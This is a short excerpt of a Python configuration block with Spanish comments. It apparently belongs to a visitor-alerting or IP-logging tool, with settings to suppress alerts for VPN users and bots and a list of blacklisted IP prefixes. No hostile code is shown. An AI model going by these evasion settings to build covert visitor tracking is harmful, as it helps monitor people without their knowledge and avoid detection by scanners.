...
config = {
    ...
    "vpnCheck": 1, # Evita que las VPN activen la alerta
                    # 0 = Sin anti-VPN
    ...
    "antiBot": 1, # Evita que los bots activen la alerta
                  # 0 = Sin anti-bot
                  # 1 = No enviar ping cuando sea posible que sea un bot
                  # 2 = No enviar ping cuando sea 100% un bot
                  # 3 = No enviar una alerta cuando sea posible que sea un bot
                  # 4 = No enviar una alerta cuando sea 100% un bot
...
blacklistedIPs = ("27", "104", "143", "164") # Blacklisted
